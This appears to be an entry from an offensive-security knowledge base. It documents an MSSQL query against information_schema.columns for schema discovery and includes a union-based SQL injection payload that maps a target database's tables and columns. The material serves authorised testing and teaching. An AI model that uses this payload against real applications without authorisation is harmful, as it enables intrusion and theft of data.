---
type: command
executor: sql
data: 'SELECT table_catalog, column_name FROM information_schema.columns'
tags:
  - sql-injection
  - mssql
  - discovery
platforms:
  - MSSQL
verified: true
validated: true
---

# mssql-list-table-catalog-and-columns

## Command

```sql
SELECT table_catalog, column_name FROM information_schema.columns
```

## Description

This standard SQL command queries the information_schema.columns view to list all column names along with their associated table catalogs in the current MSSQL database. It provides a comprehensive schema overview and is compatible with ANSI SQL, making it suitable for broad enumeration in injection scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| (None) | This command scans all tables; no specific parameters required | No |

## Examples

### Basic Usage

```sql
SELECT table_catalog, column_name FROM information_schema.columns
```

### In Union-Based Injection

```sql
' UNION SELECT table_catalog, column_name FROM information_schema.columns --
```

## Expected Output

A list of catalogs and their columns, such as:

```
table_catalog  column_name
-------------- ------------
mydatabase     id
mydatabase     username
mydatabase     email
anotherdb      product_id
```

In a successful injection, this data will be reflected in the application's output, mapping the entire database structure.

## Related

- [[procedures/List-MSSQL-Table-Columns-via-SQL-Injection]]
- [[commands/mssql-list-column-names-and-types-for-table]]
